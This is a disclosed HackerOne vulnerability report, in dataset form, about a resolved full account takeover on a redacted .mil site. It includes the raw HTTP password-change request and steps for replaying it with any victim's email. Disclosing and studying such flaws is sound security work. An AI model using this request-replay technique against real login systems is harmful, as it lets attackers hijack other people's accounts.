---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1058015'
original_report_id: '1058015'
title: Full account takeover on https://████████.mil
weakness: Improper Access Control - Generic
team_handle: deptofdefense
created_at: '2020-12-13T20:07:48.460Z'
disclosed_at: '2021-01-25T19:55:36.701Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 21
tags:
- hackerone
- improper-access-control-generic
---

# Full account takeover on https://████████.mil

## Metadata

- HackerOne Report ID: 1058015
- Weakness: Improper Access Control - Generic
- Program: deptofdefense
- Disclosed At: 2021-01-25T19:55:36.701Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

###Description

The flow in application is to sign up and wait for an email containing a one-time password, as soon as you login using that password, it asks you to change it. I took that password change request and applied on any email changing their password and it worked

###Steps to produce:

1- Copy the following request: (note `txtEMail` and `txtNewPassword` parameters)
```
POST /Login.aspx HTTP/1.1
Host: ██████████.mil
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1052
Origin: https://█████.mil
Connection: close
Referer: https://██████.mil/Login.aspx
Upgrade-Insecure-Requests: 1

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=████&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=█████████&txtMail=&txtEMail=[VICTIM_EMAIL]&reqEMailE_ClientState=&revEMailE_ClientState=&txtNewPassword=[DESIRED_PASSWORD]&btnNewPassword=Submit
```
2- Now, log in using any victim email with a random password and intercept the request at `https://█████.mil/Login.aspx`
3- Paste the request you copied above and change the `txtEMail` (to victim email) and `txtNewPassword` parameters and send it.

## Impact

Full account takeover on any user.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
